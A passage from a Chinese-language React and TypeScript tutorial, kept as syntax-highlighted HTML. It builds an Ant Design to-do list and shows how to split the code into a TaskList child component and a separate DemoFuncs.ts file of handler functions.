class=\"token function\">setDataInfo</span><span class=\"token punctuation\">(</span>newStateInfo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">addNewTaskToList</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">let</span> newStateInfo <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span> <span class=\"token operator\">...</span>dataInfo <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n    newStateInfo<span class=\"token punctuation\">.</span>taskList<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n      taskName<span class=\"token operator\">:</span> newStateInfo<span class=\"token punctuation\">.</span>taskName<span class=\"token punctuation\">,</span>\n      checkedFlag<span class=\"token operator\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// 添加任务后，清空输入框中的输入内容</span>\n    newStateInfo<span class=\"token punctuation\">.</span>taskName <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">setDataInfo</span><span class=\"token punctuation\">(</span>newStateInfo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token doc-comment comment\">/** Checkbox onChange处理逻辑 */</span>\n  <span class=\"token keyword\">function</span> <span class=\"token function\">checkedOrNotchecked</span><span class=\"token punctuation\">(</span>e<span class=\"token operator\">:</span> CheckboxChangeEvent<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">let</span> newStateInfo <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span> <span class=\"token operator\">...</span>dataInfo <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n    newStateInfo<span class=\"token punctuation\">.</span>taskList<span class=\"token punctuation\">.</span><span class=\"token function\">map</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">.</span>taskName <span class=\"token operator\">===</span> e<span class=\"token punctuation\">.</span>target<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">.</span>checkedFlag <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>target<span class=\"token punctuation\">.</span>checked<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n      <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">setDataInfo</span><span class=\"token punctuation\">(</span>newStateInfo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token doc-comment comment\">/** 删除选中的待办任务 */</span>\n  <span class=\"token keyword\">const</span> <span class=\"token function-variable function\">deleteCheckedTaskName</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">let</span> newStateInfo <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span> <span class=\"token operator\">...</span>dataInfo <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n    newStateInfo<span class=\"token punctuation\">.</span>taskList <span class=\"token operator\">=</span> newStateInfo<span class=\"token punctuation\">.</span>taskList<span class=\"token punctuation\">.</span><span class=\"token function\">filter</span><span class=\"token punctuation\">(</span>\n      <span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token operator\">!</span>item<span class=\"token punctuation\">.</span>checkedFlag\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">setDataInfo</span><span class=\"token punctuation\">(</span>newStateInfo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>\n    <span class=\"token operator\">&lt;</span>React<span class=\"token punctuation\">.</span>Fragment<span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span>h1 style<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span> textAlign<span class=\"token operator\">:</span> <span class=\"token string\">\"center\"</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>待办列表<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>h1<span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span>hr<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>hr<span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span>Row align<span class=\"token operator\">=</span><span class=\"token string\">\"middle\"</span> gutter<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">5</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>Col span<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">1</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>任务标题<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Col<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>Col span<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">11</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n          <span class=\"token punctuation\">{</span><span class=\"token doc-comment comment\">/** value属性与state对象中的taskName绑定 */</span><span class=\"token punctuation\">}</span>\n          <span class=\"token punctuation\">{</span><span class=\"token doc-comment comment\">/** 增加onChange事件处理 */</span><span class=\"token punctuation\">}</span>\n          <span class=\"token operator\">&lt;</span>Input\n            value<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>dataInfo<span class=\"token punctuation\">.</span>taskName<span class=\"token punctuation\">}</span>\n            onChange<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token function\">taskNameChange</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>target<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span>\n          <span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Input<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Col<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>Col span<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">12</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n          <span class=\"token punctuation\">{</span><span class=\"token doc-comment comment\">/** 增加onClick事件处理 */</span><span class=\"token punctuation\">}</span>\n          <span class=\"token operator\">&lt;</span>Button type<span class=\"token operator\">=</span><span class=\"token string\">\"primary\"</span> onClick<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>addNewTaskToList<span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n            添加\n          <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Button<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Col<span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Row<span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span>Row<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>Col span<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">24</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n          <span class=\"token operator\">&lt;</span>ul<span class=\"token operator\">&gt;</span>\n            <span class=\"token punctuation\">{</span><span class=\"token doc-comment comment\">/** 将原来的静态内容修改为根据taskList内容输出列表 */</span><span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">{</span>dataInfo<span class=\"token punctuation\">.</span>taskList<span class=\"token punctuation\">.</span><span class=\"token function\">map</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">(</span>\n              <span class=\"token operator\">&lt;</span>li key<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>item<span class=\"token punctuation\">.</span>taskName<span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n                <span class=\"token punctuation\">{</span><span class=\"token doc-comment comment\">/** 绑定onChange事件，否则无法选中复选框；绑定value值的目的是知道选中那条任务列表 */</span><span class=\"token punctuation\">}</span>\n                <span class=\"token punctuation\">{</span><span class=\"token comment\">/* &lt;Checkbox&gt;&lt;/Checkbox&gt; */</span><span class=\"token punctuation\">}</span>\n                <span class=\"token operator\">&lt;</span>Checkbox\n                  checked<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>item<span class=\"token punctuation\">.</span>checkedFlag<span class=\"token punctuation\">}</span>\n                  onChange<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>checkedOrNotchecked<span class=\"token punctuation\">}</span>\n                  value<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>item<span class=\"token punctuation\">.</span>taskName<span class=\"token punctuation\">}</span>\n                <span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Checkbox<span class=\"token operator\">&gt;</span>\n                <span class=\"token punctuation\">{</span>item<span class=\"token punctuation\">.</span>taskName<span class=\"token punctuation\">}</span>\n              <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>li<span class=\"token operator\">&gt;</span>\n            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span>\n          <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>ul<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Col<span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Row<span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span>Row gutter<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">5</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>Col span<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">12</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Col<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>Col span<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">12</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n          <span class=\"token operator\">&lt;</span>Button type<span class=\"token operator\">=</span><span class=\"token string\">\"primary\"</span> onClick<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>deleteCheckedTaskName<span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>删除<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Button<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Col<span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Row<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>React<span class=\"token punctuation\">.</span>Fragment<span class=\"token operator\">&gt;</span>\n  <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">default</span> DemoApp<span class=\"token punctuation\">;</span>\n\n</code></pre></div><h2>代码拆分</h2>\n<p>对于React的代码拆分，可以从两个方法来考虑：一是将组件拆解成父子组件，二是将组件的行为代码和TSX代码进行分离。</p>\n<h3>将组件拆分为父子组件</h3>\n<p>我们将显示组件的列表拆成另外一个TaskList.tsx组件。在src\\demo目录中新建TaskList.tsx文件，编辑文件内容如下：</p>\n<div class=\"language-typescript\" data-ext=\"ts\" data-title=\"ts\"><pre class=\"language-typescript\"><code><span class=\"token keyword\">import</span> React <span class=\"token keyword\">from</span> <span class=\"token string\">'react'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> Checkbox <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'antd'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">//定义接收父组件传递过来的state中的业务数据类型</span>\n<span class=\"token keyword\">type</span> <span class=\"token class-name\">ParamsType</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n    taskDataInfo<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n        taskName<span class=\"token operator\">:</span> <span class=\"token builtin\">string</span><span class=\"token punctuation\">,</span>\n        taskList<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n            taskName<span class=\"token operator\">:</span> <span class=\"token builtin\">string</span><span class=\"token punctuation\">,</span>\n            checkedFlag<span class=\"token operator\">:</span> <span class=\"token builtin\">boolean</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">//函数式组件中的参数，父组件传递过来的业务数据</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">TaskList</span><span class=\"token punctuation\">(</span>props<span class=\"token operator\">:</span> ParamsType<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>\n        <span class=\"token operator\">&lt;</span>React<span class=\"token punctuation\">.</span>Fragment<span class=\"token operator\">&gt;</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token comment\">// 遍历父组件state中的taskList数据，生成&lt;li&gt;标签</span>\n                props<span class=\"token punctuation\">.</span>taskDataInfo<span class=\"token punctuation\">.</span>taskList<span class=\"token punctuation\">.</span><span class=\"token function\">map</span><span class=\"token punctuation\">(</span>oneItem <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span>\n                    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>\n                        <span class=\"token operator\">&lt;</span>li key<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>oneItem<span class=\"token punctuation\">.</span>taskName<span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n                            <span class=\"token operator\">&lt;</span>Checkbox checked<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>oneItem<span class=\"token punctuation\">.</span>checkedFlag<span class=\"token punctuation\">}</span> value<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>oneItem<span class=\"token punctuation\">.</span>taskName<span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n                                <span class=\"token punctuation\">{</span>oneItem<span class=\"token punctuation\">.</span>taskName<span class=\"token punctuation\">}</span>\n                            <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Checkbox<span class=\"token operator\">&gt;</span>\n                            \n                        <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>li<span class=\"token operator\">&gt;</span>\n                    <span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>React<span class=\"token punctuation\">.</span>Fragment<span class=\"token operator\">&gt;</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">default</span> TaskList<span class=\"token punctuation\">;</span>\n</code></pre></div><p>TaskList.tsx首先利用关键值type定义了一个数据类型，这个type相当于C语言中的结构体，就是定义了数据父组件传递给子组件的数据的数据类型。修改DemoApp.tsx组件的代码，使用刚刚创建的子组件显示添加后的待办任务列表：</p>\n<div class=\"language-typescript\" data-ext=\"ts\" data-title=\"ts\"><pre class=\"language-typescript\"><code><span class=\"token comment\">//引入刚刚创建的子组件列表，以便在后面使用&lt;TaskList&gt;&lt;/TaskList&gt;组件</span>\n<span class=\"token keyword\">import</span> TaskList <span class=\"token keyword\">from</span> <span class=\"token string\">'./TaskList'</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">...</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">DemoApp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n<span class=\"token operator\">...</span><span class=\"token operator\">...</span>\n      <span class=\"token operator\">&lt;</span>Row<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>Col span<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">24</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n          <span class=\"token operator\">&lt;</span>ul<span class=\"token operator\">&gt;</span>\n            <span class=\"token punctuation\">{</span><span class=\"token doc-comment comment\">/** 使用子组件显示待办任务列表 */</span><span class=\"token punctuation\">}</span>\n            <span class=\"token operator\">&lt;</span>TaskList taskDataInfo<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>dataInfo<span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>TaskList<span class=\"token operator\">&gt;</span>\n          <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>ul<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Col<span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Row<span class=\"token operator\">&gt;</span>\n</code></pre></div><p>DemoApp.tsx组件的代码重点是添加了<code>import TaskList from './TaskList'</code>和后面使用组件<code>&lt;TaskList taskDataInfo={dataInfo}&gt;&lt;/TaskList&gt;</code>，这两行代码。这里标签属性<code>taskDataInfo</code>和<code>TaskList.tsx</code>文件中中type定义中字面量的key值的大小写保持一致，值就是向子组件传递的state中的数据。\n完成代码修改后，输入任务列表，点击添加按钮，可以正常添加待办列表，但是点击Checkbox，不能选中需要删除的待办任务项，这是怎么回事呢？这是因为没有为Checkbox绑定<code>onChange</code>事件处理函数，这个函数在父组件已经有定义了，我们只要在子组件中直接调用就可以了。修改TaskList.tsx文件代码如下：</p>\n<div class=\"language-typescript\" data-ext=\"ts\" data-title=\"ts\"><pre class=\"language-typescript\"><code><span class=\"token keyword\">import</span> React <span class=\"token keyword\">from</span> <span class=\"token string\">'react'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> Checkbox <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'antd'</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//引入Checkbox onChange事件的参数类型</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> CheckboxChangeEvent <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'antd/es/checkbox'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">type</span> <span class=\"token class-name\">ParamsType</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">//......</span>\n    <span class=\"token comment\">//增加定义接收函数类型的参数，</span>\n    <span class=\"token function-variable function\">checkboxChange</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">(</span>event<span class=\"token operator\">:</span> CheckboxChangeEvent<span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token keyword\">void</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">TaskList</span><span class=\"token punctuation\">(</span>props<span class=\"token operator\">:</span> ParamsType<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>\n        <span class=\"token operator\">&lt;</span>React<span class=\"token punctuation\">.</span>Fragment<span class=\"token operator\">&gt;</span>\n            <span class=\"token punctuation\">{</span>\n                props<span class=\"token punctuation\">.</span>taskDataInfo<span class=\"token punctuation\">.</span>taskList<span class=\"token punctuation\">.</span><span class=\"token function\">map</span><span class=\"token punctuation\">(</span>oneItem <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span>\n                    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>\n                        <span class=\"token operator\">&lt;</span>li key<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>oneItem<span class=\"token punctuation\">.</span>taskName<span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n                            <span class=\"token punctuation\">{</span><span class=\"token doc-comment comment\">/** onChange=<span class=\"token punctuation\">{</span>props.checkboxChange<span class=\"token punctuation\">}</span>就是绑定事件处理函数的代码 */</span><span class=\"token punctuation\">}</span>\n                            <span class=\"token operator\">&lt;</span>Checkbox checked<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>oneItem<span class=\"token punctuation\">.</span>checkedFlag<span class=\"token punctuation\">}</span> onChange<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>props<span class=\"token punctuation\">.</span>checkboxChange<span class=\"token punctuation\">}</span> value<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>oneItem<span class=\"token punctuation\">.</span>taskName<span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n                                <span class=\"token punctuation\">{</span>oneItem<span class=\"token punctuation\">.</span>taskName<span class=\"token punctuation\">}</span>\n                            <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Checkbox<span class=\"token operator\">&gt;</span>\n                            \n                        <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>li<span class=\"token operator\">&gt;</span>\n                    <span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>React<span class=\"token punctuation\">.</span>Fragment<span class=\"token operator\">&gt;</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">default</span> TaskList<span class=\"token punctuation\">;</span>\n</code></pre></div><p>修改父组件，可以通过TaskList标签，传递函数给子组件以便子组件Checkbox状态改变时修改state中对应项的值：</p>\n<div class=\"language-typescript\" data-ext=\"ts\" data-title=\"ts\"><pre class=\"language-typescript\"><code><span class=\"token operator\">&lt;</span>TaskList taskDataInfo<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>dataInfo<span class=\"token punctuation\">}</span> checkboxChange<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>checkedOrNotchecked<span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>TaskList<span class=\"token operator\">&gt;</span>\n</code></pre></div><p>属性checkboxChange的值就是一个函数（注意这里时函数本身，而不是函数调用，函数调用需要一对小括号），这个函数会作为参数被传递给子组件。\n完成这些修改后，回到浏览器页面进行验证，发现点击Checkbox后，待办项被选中或取消选中，功能又正常了。\n我们将待办任务列表迁移到子组件TaskList.tsx中，但父组件的代码还是显得有点多。下面我们尝试把部分代码迁移到一个独立的.ts文件中，让父组件只保留必要的代码。</p>\n<h3>迁移行为代码到独立的文件中</h3>\n<p>在src\\demo目录新建一个DemoFuncs.ts文件，用于保存行为代码。\n1、在DemoFuncs.ts文件中新建state数据结构</p>\n<div class=\"language-typescript\" data-ext=\"ts\" data-title=\"ts\"><pre class=\"language-typescript\"><code><span class=\"token comment\">//任务列表项数据结构</span>\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">type</span> <span class=\"token class-name\">TaskListItem</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n  taskName<span class=\"token operator\">:</span> <span class=\"token builtin\">string</span><span class=\"token punctuation\">,</span>\n  checkedFlag<span class=\"token operator\">:</span> <span class=\"token builtin\">boolean</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//state中的业务数据的数据结构</span>\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">type</span> <span class=\"token class-name\">DataInfoType</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n  taskName<span class=\"token operator\">:</span> <span class=\"token builtin\">string</span><span class=\"token punctuation\">,</span>\n  taskList<span class=\"token operator\">:</span> TaskListItem<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>修改DemoApp.tsx文件，引入DemoFuncs.ts并定义state数据结构：</p>\n<div class=\"language-typescript\" data-ext=\"ts\" data-title=\"ts\"><pre class=\"language-typescript\"><code><span class=\"token comment\">//引入DemoFuncs.ts文件</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> DataInfoType <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'./DemoFuncs'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">DemoApp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token comment\">//以泛型方式定义state的数据，名初始化state中的业务数据对象</span>\n  <span class=\"token keyword\">const</span> <span class=\"token punctuation\">[</span>dataInfo<span class=\"token punctuation\">,</span> setDataInfo<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> React<span class=\"token punctuation\">.</span><span class=\"token generic-function\"><span class=\"token function\">useState</span><span class=\"token generic class-name\"><span class=\"token operator\">&lt;</span>DataInfoType<span class=\"token operator\">&gt;</span></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n    taskName<span class=\"token operator\">:</span> <span class=\"token string\">''</span><span class=\"token punctuation\">,</span>\n    taskList<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>迁移后，再次回到浏览器打开页面，测试相关功能是否正常运行。\n2、移动函数taskNameChanged到DemoFuncs.ts文件中并修改：</p>\n<div class=\"language-typescript\" data-ext=\"ts\" data-title=\"ts\"><pre class=\"language-typescript\"><code><span class=\"token doc-comment comment\">/**\n * 输入框onChange事件处理函数\n * <span class=\"token keyword\">@param</span> <span class=\"token parameter\">newTaskname</span> 修改后的值\n * <span class=\"token keyword\">@param</span> <span class=\"token parameter\">dataInfo</span> state中的业务数据\n * <span class=\"token keyword\">@param</span> <span class=\"token parameter\">setDataInfo</span> 赋值修改值\n */</span>\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">function</span> <span class=\"token function\">taskNameChanged</span><span class=\"token punctuation\">(</span>newTaskname<span class=\"token operator\">:</span> <span class=\"token builtin\">string</span><span class=\"token punctuation\">,</span> dataInfo<span class=\"token operator\">:</span> DataInfoType<span class=\"token punctuation\">,</span> <span class=\"token function-variable function\">setDataInfo</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">(</span>value<span class=\"token operator\">:</span> DataInfoType<span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">let</span> newStateInfo <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token operator\">...</span>dataInfo<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n  newStateInfo<span class=\"token punctuation\">.</span>taskName <span class=\"token operator\">=</span> newTaskname<span class=\"token punctuation\">;</span>\n  <span class=\"token function\">setDataInfo</span><span class=\"token punctuation\">(</span>newStateInfo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token 